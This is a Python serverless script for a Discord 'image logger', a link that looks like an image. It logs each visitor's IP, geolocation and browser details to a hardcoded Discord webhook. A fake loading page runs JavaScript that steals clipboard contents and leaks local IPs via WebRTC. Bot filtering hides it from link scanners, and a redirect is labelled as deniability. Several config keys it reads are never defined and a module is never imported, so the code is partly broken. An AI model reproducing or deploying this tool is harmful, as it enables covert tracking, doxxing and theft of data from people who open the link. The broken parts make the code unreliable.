# api/image.py - Vercel serverless Discord Image Logger 2026 MAX
# Serves real image, logs every hit, fake loading overlay, clipboard/WebRTC steal
# EDUCATIONAL / RESEARCH / LAB ONLY - Never use against real people

import json
import base64
import time
import random
import traceback
import requests
from datetime import datetime
from urllib.parse import parse_qs, urlsplit

# ────────────────────────────────────────────────
# CONFIG ──────────────────────────────────────────
# ────────────────────────────────────────────────

CONFIG = {
    "webhook_url": "https://discord.com/api/webhooks/1477989584616030230/BBk-33WX3UdwmG8w1jUlGAN81Hlxr4ciDKIxRctQ6sJmSZBjDgXefoogSpFk0tXm1u7J",  # CHANGE THIS
    "default_image_url": "https://i.pinimg.com/1200x/c0/ee/be/c0eebec3d3b417a404182f6fed62f457.jpg",  # CHANGE THIS
    "username": "Image Logger 2026",
    "embed_color": 0xFF5555,
    "redirect_url": "https://www.google.com",  # deniability fallback
    "enable_overlay": True,
    "overlay_message": "Loading original high-quality image...",
    "show_spinner": True,
    "enable_clipboard_steal": True,  # tries to grab clipboard on load
    "enable_webrtc_leak": True,     # tries to leak local IPs via WebRTC
    "anti_bot_level": 2,             # 0=none, 1=skip ping, 2=skip log
    "link_alerts": True,
    "log_to_file": True,
    "log_file": "/tmp/logger_hits.log",  # Vercel writable path
    "blacklist_prefixes": (
        "34.", "35.", "66.249.", "64.233.", "207.46.", "40.77.", "157.55.",
        "104.", "143.", "164.", "172.67.", "104.21.", "172.68."
    )
}

# ────────────────────────────────────────────────
# HELPERS ────────────────────────────────────────
# ────────────────────────────────────────────────

def get_client_ip(headers):
    headers_lower = {k.lower(): v for k, v in headers.items()}
    header_order = [
        'cf-connecting-ip', 'x-forwarded-for', 'x-real-ip',
        'true-client-ip', 'x-client-ip', 'client-ip',
        'forwarded', 'via'
    ]
    for h in header_order:
        if h in headers_lower:
            val = headers_lower[h]
            if ',' in val:
                return val.split(',')[0].strip()
            return val.strip()
    return "unknown"

def is_bot_or_proxy(ip, ua):
    if any(ip.startswith(p) for p in CONFIG["blacklist_prefixes"]):
        return "Proxy/Bot"
    ua_lower = ua.lower()
    bot_keywords = [
        'bot', 'spider', 'crawler', 'discord', 'telegram', 'whatsapp',
        'curl', 'python-requests', 'httpclient', 'headless', 'phantomjs'
    ]
    if any(kw in ua_lower for kw in bot_keywords):
        return "Bot"
    return False

def log_to_file(data):
    if not CONFIG["log_to_file"]:
        return
    ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(CONFIG["log_file"], "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {json.dumps(data)}\n")
    except:
        pass  # Vercel might restrict writes

def send_webhook_embed(payload):
    embed = {
        "username": CONFIG["username"],
        "embeds": [{
            "title": "Image Logger - Hit",
            "color": CONFIG["embed_color"],
            "description": f"**IP Grabbed**\n\n```json\n{json.dumps(payload, indent=2)}\n```",
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        }]
    }
    try:
        requests.post(CONFIG["webhook_url"], json=embed, timeout=8)
    except:
        pass

def get_geo_info(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
        return r.json()
    except:
        return {}

# ────────────────────────────────────────────────
# VERCEL HANDLER ──────────────────────────────────
# ────────────────────────────────────────────────

def handler(request):
    try:
        # Extract request data
        method = request.method
        path = request.path
        query = parse_qs(request.query_string.decode())
        headers = {k.lower(): v[0] if isinstance(v, list) else v for k, v in request.headers.items()}

        ip = get_client_ip(headers)
        ua = headers.get('user-agent', 'unknown')
        endpoint = path

        # Bot/proxy filter
        bot = is_bot_or_proxy(ip, ua)
        if bot and CONFIG["anti_bot"] >= 2:
            return {
                "statusCode": 200,
                "headers": {"Content-Type": "image/webp"},
                "body": "",
                "isBase64Encoded": False
            }

        # Choose image
        image_url = CONFIG["default_image_url"]
        if CONFIG["image_argument"] and 'url' in query:
            try:
                decoded = base64.b64decode(query['url'][0]).decode()
                if decoded.startswith(('http://', 'https://')):
                    image_url = decoded
            except:
                pass

        # Gather fingerprint
        geo = get_geo_info(ip)
        os_name, browser_name = httpagentparser.simple_detect(ua)

        payload = {
            "timestamp_utc": time.strftime("%Y-%m-%d %H:%M:%S UTC"),
            "method": method,
            "endpoint": endpoint,
            "ip": ip,
            "isp": geo.get("isp", "N/A"),
            "country": geo.get("country", "N/A"),
            "region": geo.get("regionName", "N/A"),
            "city": geo.get("city", "N/A"),
            "lat_lon": f"{geo.get('lat','N/A')},{geo.get('lon','N/A')}",
            "timezone": geo.get("timezone", "N/A"),
            "proxy": geo.get("proxy", False),
            "hosting": geo.get("hosting", False),
            "user_agent": ua,
            "os": os_name,
            "browser": browser_name,
            "headers_sample": {k: v[:200] for k, v in headers.items() if k in ['user-agent', 'accept-language', 'accept']}
        }

        # Send alert & log
        if not bot or CONFIG["link_alerts"]:
            send_webhook_embed(payload)
            log_to_file(payload)

        # Serve overlay + JS fingerprinting
        if CONFIG["show_overlay"]:
            js_sniff = ""
            if CONFIG["enable_clipboard_steal"]:
                js_sniff += """
navigator.clipboard.readText().then(text => {
  fetch(window.location.href + '?clip=' + btoa(text), {method:'HEAD'});
}).catch(() => {});
"""
            if CONFIG["enable_webrtc_leak"]:
                js_sniff += """
var rtc = new RTCPeerConnection({iceServers:[]});
rtc.createDataChannel('');
rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
rtc.onicecandidate = e => {
  if (!e.candidate) return;
  fetch(window.location.href + '?webrtc=' + btoa(e.candidate.candidate), {method:'HEAD'});
  rtc.close();
};
"""

            html = f"""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading original...</title>
  <meta http-equiv="refresh" content="2;url={image_url}">
  <style>
    body {{ margin:0; background:#000; color:#fff; font-family:sans-serif; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; }}
    .msg {{ font-size:24px; margin-bottom:20px; text-align:center; }}
    .spinner {{ border:8px solid #222; border-top:8px solid #1e90ff; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; }}
    @keyframes spin {{ 0% {{ transform:rotate(0deg); }} 100% {{ transform:rotate(360deg); }} }}
  </style>
</head>
<body>
  <div class="msg">{CONFIG["overlay_message"]}</div>
  {f'<div class="spinner"></div>' if CONFIG["show_spinner"] else ''}
  <script>
    {js_sniff}
  </script>
</body>
</html>
"""
            return {
                "statusCode": 200,
                "headers": {"Content-Type": "text/html"},
                "body": html,
                "isBase64Encoded": False
            }

        # Direct image serve
        try:
            r = requests.get(image_url, timeout=8, stream=True)
            if r.status_code == 200:
                headers_out = {
                    "Content-Type": r.headers.get("Content-Type", "image/jpeg"),
                    "Cache-Control": "no-cache, no-store, must-revalidate",
                    "Content-Length": r.headers.get("Content-Length", str(len(r.content))),
                }
                return {
                    "statusCode": 200,
                    "headers": headers_out,
                    "body": r.content,
                    "isBase64Encoded": True
                }
        except:
            pass

        # Final fallback redirect
        return {
            "statusCode": 302,
            "headers": {"Location": CONFIG["redirect_url"]},
            "body": ""
        }

    except Exception as e:
        traceback.print_exc()
        return {
            "statusCode": 500,
            "headers": {"Content-Type": "text/plain"},
            "body": "Internal Server Error"
        }

# Vercel expects this export name
def main(request):
    return handler(request)